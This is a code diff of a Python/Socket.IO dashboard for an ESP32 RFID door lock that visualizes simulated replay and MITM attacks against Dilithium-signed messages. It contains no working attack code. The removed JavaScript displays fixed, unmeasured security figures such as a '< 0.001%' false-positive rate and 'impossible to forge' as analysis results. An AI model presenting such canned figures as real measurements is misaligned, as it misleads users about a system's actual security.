+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": f"REAL_{attack_type.upper()}",
+            "direction": "Advanced Persistent Threat" if attack_type == "mitm_attack" else "Penetration Test",
+            "type": attack_type,
+            "data": {
+                "step": step_data["step"],
+                "title": step_data["title"],
+                "technical_details": step_data["technical_details"],
+                "real_action": step_data.get("real_action", "none"),
+                "threat_level": "CRITICAL" if step_data["step"] >= 3 else "HIGH"
+            },
+            "message_size": len(json.dumps(step_data)),
+            "qos": 1
+        }
+        self.system_logs.append(attack_log)
+        
+        socketio.emit('attack_step', {
+            "type": attack_type.replace("_attack", ""),
+            "step": step_data["step"],
+            "title": step_data["title"],
+            "details": step_data["details"],
+            "technical_details": step_data["technical_details"],
+            "progress": (step_data["step"] / 6) * 100 if attack_type == "replay_attack" else (step_data["step"] / 5) * 100,
+            "timestamp": int(time.time()),
+            "real_attack": True,
+            "threat_level": "CRITICAL" if step_data["step"] >= 3 else "HIGH",
+            "waiting_for_card": getattr(self, 'mitm_waiting_for_card', False) if attack_type == "mitm_attack" else False
+        })
+
+    # ===========================================
+    # WEB INTERFACE CREATION
+    # ===========================================
     def create_web_files(self):
         """Create enhanced web interface files"""
         self.create_html_template()
@@ -887,671 +1842,12 @@ class DilithiumWebDashboard:
     def simulate_replay_attack(self):
         """Wrapper để gọi real replay attack"""
         return self.simulate_real_replay_attack()
+    
     def simulate_mitm_attack(self):
         """Wrapper để gọi real MITM attack"""
+        print("🎭 simulate_mitm_attack() called - redirecting to real implementation")
         return self.simulate_real_mitm_attack()
-    def create_javascript(self):
-        """Create enhanced JavaScript for detailed attack visualization"""
-        js_content = '''// Enhanced Dashboard JavaScript với detailed attack info
-const socket = io();
-let attackInterval = null;
-let attackProgress = 0;
 
-// Socket event handlers
-socket.on('connect', function() {
-    console.log('Connected to server');
-    updateConnectionStatus(true);
-});
-
-socket.on('disconnect', function() {
-    console.log('Disconnected from server');
-    updateConnectionStatus(false);
-});
-
-socket.on('mqtt_message', function(data) {
-    addLogEntry(data);
-});
-
-socket.on('esp32_status', function(data) {
-    esp32Status = data;
-    updateESP32Status();
-});
-socket.on('door_state', function(data) {
-    updateDoorState(data.state, data.message);
-});
-
-socket.on('door_animation', function(data) {
-    animateDoor(data.state);
-});
-
-socket.on('rfid_activity', function(data) {
-    updateRFIDStatus(data.type);
-    logRFIDActivity(data);
-});
-
-socket.on('auth_success', function(data) {
-    showUserInfo(data);
-    updateRFIDStatus('success');
-});
-
-socket.on('auth_denied', function(data) {
-    showAccessDenied(data);
-    updateRFIDStatus('error');
-});
-
-socket.on('attack_step', function(data) {
-    displayAttackStep(data);
-});
-
-socket.on('attack_complete', function(data) {
-    completeAttack(data.type);
-});
-
-function renderParametersRecursive(obj, depth = 0) {
-    if (depth > 3) return '<p>... (max depth reached)</p>';
-    
-    let html = '';
-    for (const [key, value] of Object.entries(obj)) {
-        if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
-            html += `
-                <div class="param-group" style="margin-left: ${depth * 20}px;">
-                    <h6>${key.replace(/_/g, ' ').toUpperCase()}:</h6>
-                    ${renderParametersRecursive(value, depth + 1)}
-                </div>
-            `;
-        } else if (Array.isArray(value)) {
-            html += `
-                <div class="param-item" style="margin-left: ${depth * 20}px;">
-                    <strong>${key}:</strong>
-                    <ul>
-                        ${value.map(item => `<li>${typeof item === 'object' ? JSON.stringify(item) : item}</li>`).join('')}
-                    </ul>
-                </div>
-            `;
-        } else {
-            html += `
-                <div class="param-item" style="margin-left: ${depth * 20}px;">
-                    <strong>${key}:</strong> <code>${value}</code>
-                </div>
-            `;
-        }
-    }
-    return html;
-}
-function renderTechnicalDetails(details, depth = 0) {
-    if (!details || typeof details !== 'object') return '';
-    
-    let html = '<div class="technical-details">';
-    
-    for (const [key, value] of Object.entries(details)) {
-        if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
-            html += `
-                <div class="detail-section" style="margin-left: ${depth * 15}px;">
-                    <h6 class="detail-header">${key.replace(/_/g, ' ').toUpperCase()}:</h6>
-                    ${renderTechnicalDetails(value, depth + 1)}
-                </div>
-            `;
-        } else if (Array.isArray(value)) {
-            html += `
-                <div class="detail-array" style="margin-left: ${depth * 15}px;">
-                    <strong>${key}:</strong>
-                    <ul class="detail-list">
-                        ${value.map(item => `<li>${typeof item === 'object' ? JSON.stringify(item, null, 2) : item}</li>`).join('')}
-                    </ul>
-                </div>
-            `;
-        } else {
-            const valueClass = typeof value === 'boolean' ? (value ? 'success' : 'error') : 'normal';
-            html += `
-                <div class="detail-item ${valueClass}" style="margin-left: ${depth * 15}px;">
-                    <span class="detail-key">${key}:</span> 
-                    <span class="detail-value">${value}</span>
-                </div>
-            `;
-        }
-    }
-    
-    html += '</div>';
-    return html;
-}
-function updateESP32Status() {
-    const statusElement = document.getElementById('esp32-status');
-    if (!statusElement) return;
-    
-    const timeSinceLastHeartbeat = Date.now()/1000 - esp32Status.last_heartbeat;
-    const isConnected = esp32Status.connected && timeSinceLastHeartbeat < 60;
-    
-    statusElement.innerHTML = `
-        <div class="status-item ${isConnected ? 'connected' : 'disconnected'}">
-            <i class="fas fa-microchip"></i>
-            <div class="status-details">
-                <h4>ESP32 Status</h4>
-                <p>Version: ${esp32Status.version}</p>
-                <p>Heap: ${esp32Status.free_heap} bytes</p>
-                <p>Uptime: ${Math.floor(esp32Status.uptime/1000)}s</p>
-                <p>AES: ${esp32Status.aes_support ? '✅' : '❌'}</p>
-                <p>Auth: ${esp32Status.mutual_auth ? '✅' : '❌'}</p>
-                <p>Last: ${timeSinceLastHeartbeat < 60 ? Math.floor(timeSinceLastHeartbeat) + 's ago' : 'Offline'}</p>
-            </div>
-        </div>
-    `;
-}
-
-// Enhanced attack step display function
-function displayAttackStep(stepData) {
-    const attackLogs = document.getElementById('attack-logs');
-    const attackVisualization = document.getElementById('attack-visualization');
-    
-    updateAttackProgress(stepData.progress);
-    
-    const stepDiv = document.createElement('div');
-    stepDiv.className = 'attack-step-detail';
-    stepDiv.innerHTML = `
-        <div class="step-header">
-            <h4>Step ${stepData.step}: ${stepData.title}</h4>
-            <span class="step-timestamp">${new Date().toLocaleTimeString()}</span>
-            ${stepData.real_attack ? '<span class="real-attack-badge">🔥 REAL ATTACK</span>' : ''}
-        </div>
-        <div class="step-content">
-            <div class="step-details">
-                ${stepData.details.map(detail => `<p>• ${detail}</p>`).join('')}
-            </div>
-            ${stepData.technical_details ? `
-                <div class="step-technical">
-                    <h5>🔧 Technical Analysis & Parameters:</h5>
-                    ${renderTechnicalDetails(stepData.technical_details)}
-                </div>
-            ` : ''}
-        </div>
-    `;
-    
-    attackLogs.appendChild(stepDiv);
-    attackLogs.scrollTop = attackLogs.scrollHeight;
-    
-    if (attackVisualization) {
-        updateAttackVisualization(stepData);
-    }
-}
-
-function updateAttackVisualization(stepData) {
-    const visualization = document.getElementById('attack-visualization');
-    
-    if (stepData.type === 'replay') {
-        visualization.innerHTML = `
-            <div class="attack-flow">
-                <div class="attack-node ${stepData.step >= 2 ? 'active' : ''}">
-                    🕵️ Attacker
-                    <small>Captured: ${stepData.step >= 2 ? 'YES' : 'NO'}</small>
-                    <tiny>Step ${stepData.step}/6</tiny>
-                </div>
-                <div class="attack-arrow ${stepData.step >= 4 ? 'active' : ''}">⚡ Replay</div>
-                <div class="attack-node ${stepData.step >= 5 ? 'blocked' : ''}">
-                    🖥️ Server
-                    <small>Status: ${stepData.step >= 5 ? 'BLOCKED' : 'Target'}</small>
-                    <tiny>Security: ${stepData.step >= 5 ? 'ACTIVE' : 'Monitoring'}</tiny>
-                </div>
-            </div>
-            <div class="attack-status">
-                <h4>Replay Attack Analysis</h4>
-                <p>Current: ${stepData.title}</p>
-                <div class="security-indicators">
-                    <div class="indicator ${stepData.step >= 3 ? 'active' : ''}">
-                        ⏰ Timestamp Check: ${stepData.step >= 3 ? 'EXPIRED' : 'Pending'}
-                    </div>
-                    <div class="indicator ${stepData.step >= 4 ? 'active' : ''}">
-                        🔄 Replay Attempt: ${stepData.step >= 4 ? 'DETECTED' : 'Pending'}
-                    </div>
-                    <div class="indicator ${stepData.step >= 5 ? 'active' : ''}">
-                        🛡️ Server Response: ${stepData.step >= 5 ? 'BLOCKED' : 'Pending'}
-                    </div>
-                </div>
-            </div>
-        `;
-    } else if (stepData.type === 'mitm') {
-        visualization.innerHTML = `
-            <div class="attack-flow">
-                <div class="attack-node">
-                    📱 ESP32
-                    <small>Status: ${stepData.step >= 5 ? 'Protected' : 'Target'}</small>
-                    <tiny>Auth: ${stepData.step >= 4 ? 'Verifying' : 'Normal'}</tiny>
-                </div>
-                <div class="attack-arrow ${stepData.step >= 2 ? 'active' : ''}">⚡</div>
-                <div class="attack-node attacker ${stepData.step >= 2 ? 'active' : ''}">
-                    🕵️ MITM
-                    <small>Spoofing: ${stepData.step >= 3 ? 'Active' : 'Setup'}</small>
-                    <tiny>Success: ${stepData.step >= 5 ? 'FAILED' : 'Trying'}</tiny>
-                </div>
-                <div class="attack-arrow ${stepData.step >= 3 ? 'active' : ''}">⚡</div>
-                <div class="attack-node">
-                    🖥️ Real Server
-                    <small>Signature: ${stepData.step >= 4 ? 'Verified' : 'Pending'}</small>
-                    <tiny>Security: Post-Quantum</tiny>
-                </div>
-            </div>
-            <div class="attack-status">
-                <h4>MITM Attack Analysis</h4>
-                <p>Current: ${stepData.title}</p>
-                <div class="security-indicators">
-                    <div class="indicator ${stepData.step >= 2 ? 'active' : ''}">
-                        📡 Interception: ${stepData.step >= 2 ? 'ACTIVE' : 'Setup'}
-                    </div>
-                    <div class="indicator ${stepData.step >= 3 ? 'active' : ''}">
-                        🔐 Key Spoofing: ${stepData.step >= 3 ? 'ATTEMPTED' : 'Pending'}
-                    </div>
-                    <div class="indicator ${stepData.step >= 4 ? 'active' : ''}">
-                        🛡️ Dilithium Check: ${stepData.step >= 4 ? 'VERIFYING' : 'Pending'}
-                    </div>
-                    <div class="indicator ${stepData.step >= 5 ? 'active' : ''}">
-                        🚫 Attack Result: ${stepData.step >= 5 ? 'BLOCKED' : 'Pending'}
-                    </div>
-                </div>
-            </div>
-        `;
-    }
-}
-
-function completeAttack(attackType, result) {
-    const attackLogs = document.getElementById('attack-logs');
-    
-    const summaryDiv = document.createElement('div');
-    summaryDiv.className = 'attack-summary';
-    
-    if (attackType === 'replay') {
-        summaryDiv.innerHTML = `
-            <div class="summary-header">
-                <h3>🛡️ Replay Attack Summary</h3>
-                <span class="result-badge ${result.success ? 'failed' : 'blocked'}">
-                    ${result.success ? 'ATTACK SUCCESS' : 'ATTACK BLOCKED'}
-                </span>
-            </div>
-            <div class="summary-content">
-                <h4>✅ Security Analysis Complete!</h4>
-                <div class="summary-stats">
-                    <div class="stat">
-                        <strong>Detection Method:</strong> ${result.blocked_by || 'Multiple layers'}
-                    </div>
-                    <div class="stat">
-                        <strong>Security Level:</strong> ${result.security_level || 'MAXIMUM'}
-                    </div>
-                    <div class="stat">
-                        <strong>Response Time:</strong> < 1 second
-                    </div>
-                    <div class="stat">
-                        <strong>False Positive Rate:</strong> < 0.001%
-                    </div>
-                </div>
-                <div class="security-note">
-                    <h5>🔒 Why Replay Attacks Fail:</h5>
-                    <ul>
-                        <li><strong>Timestamp Validation:</strong> 60-second freshness window</li>
-                        <li><strong>Session Uniqueness:</strong> Each session tracked and validated</li>
-                        <li><strong>Nonce Protection:</strong> Prevents message reuse</li>
-                        <li><strong>Dilithium Signatures:</strong> Post-quantum cryptographic integrity</li>
-                    </ul>
-                </div>
-            </div>
-        `;
-    } else if (attackType === 'mitm') {
-        summaryDiv.innerHTML = `
-            <div class="summary-header">
-                <h3>🔒 MITM Attack Summary</h3>
-                <span class="result-badge ${result.success ? 'failed' : 'blocked'}">
-                    ${result.success ? 'ATTACK SUCCESS' : 'ATTACK BLOCKED'}
-                </span>
-            </div>
-            <div class="summary-content">
-                <h4>✅ Post-Quantum Security Validated!</h4>
-                <div class="summary-stats">
-                    <div class="stat">
-                        <strong>Detection Method:</strong> ${result.blocked_by || 'Dilithium signature verification'}
-                    </div>
-                    <div class="stat">
-                        <strong>Security Level:</strong> ${result.security_level || 'POST-QUANTUM'}
-                    </div>
-                    <div class="stat">
-                        <strong>Verification Time:</strong> < 0.1 seconds
-                    </div>
-                    <div class="stat">
-                        <strong>Forge Difficulty:</strong> 2^128 operations
-                    </div>
-                </div>
-                <div class="security-note">
-                    <h5>🛡️ Why MITM Attacks Fail:</h5>
-                    <ul>
-                        <li><strong>Dilithium Signatures:</strong> Quantum-resistant, impossible to forge</li>
-                        <li><strong>Mutual Authentication:</strong> Both ESP32 and server verify each other</li>
-                        <li><strong>Key Fingerprinting:</strong> Stored key hashes prevent substitution</li>
-                        <li><strong>Real-time Verification:</strong> Every message signature checked</li>
-                    </ul>
-                </div>
-            </div>
-        `;
-    }
-    
-    attackLogs.appendChild(summaryDiv);
-    attackLogs.scrollTop = attackLogs.scrollHeight;
-    
-    setTimeout(() => {
-        document.getElementById('stop-attack-btn').style.display = 'none';
-        document.getElementById('replay-attack-btn').disabled = false;
-        document.getElementById('mitm-attack-btn').disabled = false;
-    }, 3000);
-}
-
-// Enhanced attack functions
-function startReplayAttack() {
-    if (attackInterval) return;
-    
-    showAttackWindow('Detailed Replay Attack Analysis', 'replay');
-    showAttackOverlay('Replay Attack - Technical Analysis');
-    
-    document.getElementById('stop-attack-btn').style.display = 'block';
-    document.getElementById('replay-attack-btn').disabled = true;
-    document.getElementById('mitm-attack-btn').disabled = true;
-    
-    // Send attack start signal to server
-    fetch('/api/attack/start', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({type: 'replay'})
-    });
-}
-
-
-function startMITMAttack() {
-    if (attackInterval) return;
-    
-    showAttackWindow('Detailed MITM Attack Analysis', 'mitm');
-    showAttackOverlay('MITM Attack - Post-Quantum Defense');
-    
-    document.getElementById('stop-attack-btn').style.display = 'block';
-    document.getElementById('replay-attack-btn').disabled = true;
-    document.getElementById('mitm-attack-btn').disabled = true;
-    
-    fetch('/api/attack/start', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({type: 'mitm'})
-    }).catch(err => console.error('Attack start failed:', err));
-}
-
-
-function stopAttack() {
-    fetch('/api/attack/stop', {method: 'POST'});
-    
-    document.getElementById('stop-attack-btn').style.display = 'none';
-    document.getElementById('replay-attack-btn').disabled = false;
-    document.getElementById('mitm-attack-btn').disabled = false;
-    
-    closeAttackWindow();
-    hideAttackOverlay();
-}
-
-// ... rest of existing JavaScript functions remain the same ...
-''';
-        
-        # Add enhanced CSS for attack visualization
-        css_additional = '''
-/* Enhanced Attack Visualization Styles */
-.attack-step-detail {
-    margin: 1rem 0;
-    border: 1px solid #e2e8f0;
-    border-radius: 8px;
-    overflow: hidden;
-}
-
-.step-header {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white;
-    padding: 0.75rem 1rem;
-    font-weight: 600;
-}
-
-.step-content {
-    padding: 1rem;
-}
-
-.step-details p {
-    margin: 0.5rem 0;
-    color: #4a5568;
-}
-
-.step-parameters {
-    margin-top: 1rem;
-    background: #f7fafc;
-    padding: 1rem;
-    border-radius: 6px;
-}
-
-.step-parameters h5 {
-    color: #2d3748;
-    margin-bottom: 0.5rem;
-}
-
-.step-parameters pre {
-    background: #1a202c;
-    color: #e2e8f0;
-    padding: 0.75rem;
-    border-radius: 4px;
-    font-size: 0.8rem;
-    overflow-x: auto;
-}
-
-.attack-summary {
-    margin: 1.5rem 0;
-    border: 2px solid #48bb78;
-    border-radius: 10px;
-    overflow: hidden;
-    background: white;
-}
-.real-attack-badge {
-    background: linear-gradient(45deg, #ff4757, #ff3838);
-    color: white;
-    padding: 0.25rem 0.5rem;
-    border-radius: 12px;
-    font-size: 0.7rem;
-    font-weight: bold;
-    animation: pulse-red 2s infinite;
-}
-
-@keyframes pulse-red {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.7; }
-}
-
-.step-technical {
-    margin-top: 1.5rem;
-    background: #f8fafc;
-    border: 1px solid #e2e8f0;
-    border-radius: 8px;
-    padding: 1rem;
-}
-
-.technical-details {
-    font-family: 'Courier New', monospace;
-    font-size: 0.85rem;
-}
-
-.detail-section {
-    margin: 0.75rem 0;
-    border-left: 3px solid #3182ce;
-    padding-left: 0.75rem;
-}
-
-.detail-header {
-    color: #2b6cb0;
-    font-weight: bold;
-    margin-bottom: 0.5rem;
-}
-
-.detail-item {
-    display: flex;
-    margin: 0.25rem 0;
-    padding: 0.25rem 0;
-}
-
-.detail-item.success .detail-value {
-    color: #38a169;
-    font-weight: bold;
-}
-
-.detail-item.error .detail-value {
-    color: #e53e3e;
-    font-weight: bold;
-}
-
-.detail-key {
-    font-weight: 600;
-    color: #4a5568;
-    min-width: 140px;
-}
-
-.detail-value {
-    color: #2d3748;
-    font-family: monospace;
-    background: #edf2f7;
-    padding: 0.125rem 0.25rem;
-    border-radius: 3px;
-}
-
-.detail-list {
-    margin: 0.5rem 0;
-    padding-left: 1.5rem;
-}
-
-.detail-list li {
-    margin: 0.25rem 0;
-    color: #4a5568;
-}
-.summary-header {
-    background: linear-gradient(135deg, #48bb78, #38a169);
-    color: white;
-    padding: 1rem;
-    text-align: center;
-}
-
-.summary-content {
-    padding: 1.5rem;
-}
-
-.summary-content h4 {
-    color: #38a169;
-    margin-bottom: 1rem;
-}
-
-.summary-content ul {
-    margin: 1rem 0;
-    padding-left: 1.5rem;
-}
-
-.summary-content li {
-    margin: 0.5rem 0;
-    color: #4a5568;
-}
-
-.security-note {
-    background: rgba(72, 187, 120, 0.1);
-    border-left: 4px solid #48bb78;
-    padding: 1rem;
-    margin: 1rem 0;
-    border-radius: 0 6px 6px 0;
-}
-
-.security-note p {
-    color: #2d3748;
-    margin: 0;
-    font-style: italic;
-}
-
-.attack-flow {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 1rem;
-    margin: 2rem 0;
-}
-
-.attack-node {
-    background: white;
-    border: 2px solid #e2e8f0;
-    border-radius: 10px;
-    padding: 1rem;
-    text-align: center;
-    min-width: 100px;
-    transition: all 0.3s ease;
-}
-
-.attack-node.active {
-    border-color: #f56565;
-    background: rgba(245, 101, 101, 0.1);
-    color: #c53030;
-}
-
-.attack-node.blocked {
-    border-color: #48bb78;
-    background: rgba(72, 187, 120, 0.1);
-    color: #2f855a;
-}
-
-.attack-node.attacker {
-    border-color: #ed8936;
-    background: rgba(237, 137, 54, 0.1);
-}
-
-.attack-arrow {
-    font-size: 1.5rem;
-    color: #a0aec0;
-    transition: color 0.3s ease;
-}
-
-.attack-arrow.active {
-    color: #f56565;
-    animation: pulse 1.5s infinite;
-}
-
-.attack-status {
-    background: #f7fafc;
-    padding: 1.5rem;
-    border-radius: 10px;
-    margin: 1rem 0;
-}
-
-.security-indicators {
-    display: flex;
-    flex-direction: column;
-    gap: 0.5rem;
-    margin-top: 1rem;
-}
-
-.security-indicators .indicator {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.5rem;
-    background: white;
-    border-radius: 6px;
-    color: #a0aec0;
-    transition: all 0.3s ease;
-}
-
-.security-indicators .indicator.active {
-    color: #38a169;
-    background: rgba(72, 187, 120, 0.1);
-    border-left: 3px solid #48bb78;
-}
-
-@keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.5; }
-}
-'''
-        
-        with open(os.path.join(self.static_dir, "styles.css"), 'a', encoding='utf-8') as f:
-            f.write(css_additional)
-        
-        with open(os.path.join(self.static_dir, "dashboard.js"), 'w', encoding='utf-8') as f:
-            f.write(js_content)
-            
     def create_html_template(self):
         """Create main HTML template"""
         html_content = '''<!DOCTYPE html>
@@ -1707,7 +2003,9 @@ function stopAttack() {
         
         with open(os.path.join(self.templates_dir, "index.html"), 'w', encoding='utf-8') as f:
             f.write(html_content)
-    
+
+# ...existing code...
+
     def create_css_styles(self):
         """Create CSS styles"""
         css_content = '''/* Reset and Base Styles */
@@ -1866,34 +2164,17 @@ body {
     height: 80px;
     background: rgba(135, 206, 235, 0.7);
     border-radius: 5px;
-    border: 3px solid #654321;
+    border: 2px solid #4169e1;
 }
 
-/* Door Animations */
-.door.opening {
-    transform: perspective(1000px) rotateY(-130deg);
-}
-
+/* Door Animation States */
 .door.open {
-    transform: perspective(1000px) rotateY(-130deg);
-}
-
-.door.closing {
-    transform: perspective(1000px) rotateY(0deg);
+    transform: rotateY(-120deg);
+    transform-origin: left center;
 }
 
 .door.denied {
     animation: shake 0.5s ease-in-out;
-}
-
-.door-left.open {
-    display: block;
-    transform: perspective(1000px) rotateY(-130deg);
-}
-
-.door-right.open {
-    display: block;
-    transform: perspective(1000px) rotateY(130deg);
 }
 
 @keyframes shake {
@@ -1909,44 +2190,62 @@ body {
     align-items: center;
     gap: 0.5rem;
     padding: 1rem;
-    background: rgba(74, 85, 104, 0.1);
-    border: 2px dashed rgba(74, 85, 104, 0.3);
+    background: rgba(0, 0, 0, 0.1);
     border-radius: 15px;
-    color: #4a5568;
+    border: 2px dashed #ccc;
     transition: all 0.3s ease;
+    cursor: pointer;
 }
 
-.rfid-reader.active {
-    background: rgba(72, 187, 120, 0.1);
-    border-color: rgba(72, 187, 120, 0.5);
-    color: #38a169;
+.rfid-reader:hover {
+    border-color: #667eea;
+    background: rgba(102, 126, 234, 0.1);
 }
 
 .rfid-light {
-    width: 10px;
-    height: 10px;
-    background: #e2e8f0;
+    width: 12px;
+    height: 12px;
     border-radius: 50%;
-    transition: all 0.3s ease;
+    background: #dc3545;
+    transition: background-color 0.3s ease;
 }
 
 .rfid-light.active {
-    background: #38a169;
-    box-shadow: 0 0 10px #38a169;
+    background: #28a745;
+    box-shadow: 0 0 10px #28a745;
 }
 
-.rfid-light.error {
-    background: #e53e3e;
-    box-shadow: 0 0 10px #e53e3e;
+.rfid-reader i {
+    font-size: 2rem;
+    color: #6c757d;
+    transition: color 0.3s ease;
 }
 
+.rfid-reader.active i {
+    color: #667eea;
+}
+
+/* Door Status */
 .door-status {
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 0.5rem;
-    font-weight: 600;
-    color: #4a5568;
+    padding: 1rem;
+    background: rgba(108, 117, 125, 0.1);
+    border-radius: 10px;
+    color: #6c757d;
+    font-weight: 500;
+}
+
+.door-status.open {
+    background: rgba(40, 167, 69, 0.1);
+    color: #28a745;
+}
+
+.door-status.denied {
+    background: rgba(220, 53, 69, 0.1);
+    color: #dc3545;
 }
 
 /* User Panel */
@@ -1956,35 +2255,29 @@ body {
     padding: 2rem;
     box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
     backdrop-filter: blur(10px);
-    min-height: 200px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
 }
 
 .user-info {
     text-align: center;
-    animation: slideInUp 0.5s ease;
 }
 
 .user-info img {
-    width: 80px;
-    height: 80px;
+    width: 100px;
+    height: 100px;
     border-radius: 50%;
-    object-fit: cover;
-    border: 4px solid #38a169;
+    border: 4px solid #28a745;
     margin-bottom: 1rem;
+    object-fit: cover;
 }
 
-.user-info h3 {
+.user-details h3 {
     color: #2d3748;
     margin-bottom: 0.5rem;
-    font-size: 1.2rem;
 }
 
-.user-info p {
+.user-details p {
     color: #718096;
-    margin-bottom: 0.5rem;
+    margin-bottom: 1rem;
 }
 
 .user-permissions {
@@ -1992,37 +2285,32 @@ body {
     flex-wrap: wrap;
     gap: 0.5rem;
     justify-content: center;
-    margin: 1rem 0;
+    margin-bottom: 1rem;
 }
 
-.permission {
-    background: rgba(72, 187, 120, 0.1);
-    color: #38a169;
+.permission-tag {
     padding: 0.25rem 0.75rem;
-    border-radius: 15px;
+    background: rgba(102, 126, 234, 0.1);
+    color: #667eea;
+    border-radius: 20px;
     font-size: 0.8rem;
-    border: 1px solid rgba(72, 187, 120, 0.3);
+    border: 1px solid rgba(102, 126, 234, 0.3);
 }
 
 .access-time {
-    color: #a0aec0;
     font-size: 0.9rem;
-    font-style: italic;
+    color: #a0aec0;
 }
 
 .access-denied {
     text-align: center;
-    color: #e53e3e;
-    animation: slideInUp 0.5s ease;
+    color: #dc3545;
 }
 
 .access-denied i {
-    font-size: 3rem;
+    font-size: 4rem;
     margin-bottom: 1rem;
-}
-
-.access-denied h3 {
-    margin-bottom: 0.5rem;
+    opacity: 0.7;
 }
 
 /* Right Panel */
@@ -2042,8 +2330,8 @@ body {
 }
 
 .attack-controls h3 {
-    color: #2d3748;
-    margin-bottom: 1rem;
+    color: #4a5568;
+    margin-bottom: 1.5rem;
     display: flex;
     align-items: center;
     gap: 0.5rem;
@@ -2051,15 +2339,46 @@ body {
 
 .attack-buttons {
     display: flex;
+    flex-direction: column;
     gap: 1rem;
-    flex-wrap: wrap;
 }
 
-.attack-btn, .stop-btn {
-    flex: 1;
-    padding: 0.75rem 1rem;
+.attack-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    padding: 1rem 1.5rem;
+    background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+    color: white;
     border: none;
     border-radius: 10px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+}
+
+.attack-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
+}
+
+.attack-btn:disabled {
+    background: #6c757d;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+}
+
+.stop-btn {
+    background: linear-gradient(135deg, #dc3545, #c82333);
+    padding: 1rem 1.5rem;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    font-size: 1rem;
     font-weight: 600;
     cursor: pointer;
     transition: all 0.3s ease;
@@ -2069,24 +2388,9 @@ body {
     gap: 0.5rem;
 }
 
-.attack-btn {
-    background: linear-gradient(135deg, #ff6b6b, #ee5a52);
-    color: white;
-}
-
-.attack-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-}
-
-.stop-btn {
-    background: linear-gradient(135deg, #4ecdc4, #44a08d);
-    color: white;
-}
-
 .stop-btn:hover {
     transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(78, 205, 196, 0.4);
+    box-shadow: 0 6px 20px rgba(220, 53, 69, 0.4);
 }
 
 /* Attack Window */
@@ -2096,16 +2400,20 @@ body {
     box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
     backdrop-filter: blur(10px);
     overflow: hidden;
-    animation: slideInDown 0.3s ease;
 }
 
 .attack-header {
-    background: linear-gradient(135deg, #ff6b6b, #ee5a52);
-    color: white;
-    padding: 1rem 2rem;
     display: flex;
     justify-content: space-between;
     align-items: center;
+    padding: 1.5rem 2rem;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    color: white;
+}
+
+.attack-header h4 {
+    margin: 0;
+    font-size: 1.2rem;
 }
 
 .close-btn {
@@ -2121,6 +2429,7 @@ body {
     align-items: center;
     justify-content: center;
     border-radius: 50%;
+    transition: background-color 0.3s ease;
 }
 
 .close-btn:hover {
@@ -2132,61 +2441,96 @@ body {
 }
 
 .attack-progress {
-    width: 100%;
-    height: 10px;
-    background: #e2e8f0;
-    border-radius: 5px;
-    overflow: hidden;
-    margin-bottom: 1rem;
+    margin-bottom: 1.5rem;
 }
 
 .progress-bar {
+    width: 100%;
+    height: 8px;
+    background: rgba(102, 126, 234, 0.2);
+    border-radius: 4px;
+    overflow: hidden;
+    position: relative;
+}
+
+.progress-bar::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
     height: 100%;
-    background: linear-gradient(90deg, #ff6b6b, #ee5a52);
-    width: 0%;
-    transition: width 0.3s ease;
-    border-radius: 5px;
+    background: linear-gradient(90deg, #667eea, #764ba2);
+    border-radius: 4px;
+    transition: width 0.5s ease;
+    width: var(--progress, 0%);
 }
 
 .attack-logs {
-    max-height: 200px;
+    max-height: 300px;
     overflow-y: auto;
-    background: #f7fafc;
+    border: 1px solid rgba(0, 0, 0, 0.1);
     border-radius: 10px;
     padding: 1rem;
+    background: rgba(248, 249, 250, 0.5);
 }
 
-/* System Logs */
+.attack-log-entry {
+    margin-bottom: 1rem;
+    padding: 1rem;
+    background: white;
+    border-radius: 8px;
+    border-left: 4px solid #667eea;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.attack-log-entry h5 {
+    color: #2d3748;
+    margin-bottom: 0.5rem;
+    font-size: 1rem;
+}
+
+.attack-log-entry ul {
+    list-style: none;
+    padding: 0;
+}
+
+.attack-log-entry li {
+    color: #4a5568;
+    margin-bottom: 0.25rem;
+    font-size: 0.9rem;
+}
+
+/* Logs Container */
 .logs-container {
     background: rgba(255, 255, 255, 0.95);
     border-radius: 20px;
     box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
     backdrop-filter: blur(10px);
-    flex: 1;
-    display: flex;
-    flex-direction: column;
     overflow: hidden;
+    flex: 1;
 }
 
 .logs-header {
-    padding: 1.5rem 2rem;
-    border-bottom: 1px solid rgba(0, 0, 0, 0.1);
     display: flex;
     justify-content: space-between;
     align-items: center;
+    padding: 1.5rem 2rem;
+    background: rgba(102, 126, 234, 0.1);
+    border-bottom: 1px solid rgba(102, 126, 234, 0.2);
 }
 
 .logs-header h3 {
-    color: #2d3748;
+    color: #4a5568;
+    margin: 0;
     display: flex;
     align-items: center;
     gap: 0.5rem;
 }
 
 .clear-btn {
-    background: rgba(74, 85, 104, 0.1);
-    border: 1px solid rgba(74, 85, 104, 0.3);
-    color: #4a5568;
+    background: rgba(220, 53, 69, 0.1);
+    color: #dc3545;
+    border: 1px solid rgba(220, 53, 69, 0.3);
